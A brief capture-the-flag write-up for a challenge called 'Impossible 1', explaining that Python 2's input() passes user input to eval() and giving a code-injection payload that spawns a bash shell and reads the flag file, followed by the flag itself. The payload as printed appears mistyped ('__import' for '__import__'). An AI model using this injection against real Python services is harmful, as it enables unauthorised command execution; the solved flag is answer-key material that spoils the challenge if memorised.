### Challenge
- **Challege Name** - Impossible 1
- **Author** - h4cky0u
- **Points** - 100  
- **Description** - Old is gold

### Solution

The container uses `Python2`, and unlike `Python3`, the `input()` function in `Python 2` internally passes user input directly to `eval()`

Hence, it's a python code injection vulnerability 

Use that to get a shell then fetch the flag

Here's the payload:

```bash
__import('os').system('bash')
cat /flag*
```

### Flag

```
cseanctf26{python_code_injection_ftw}
```
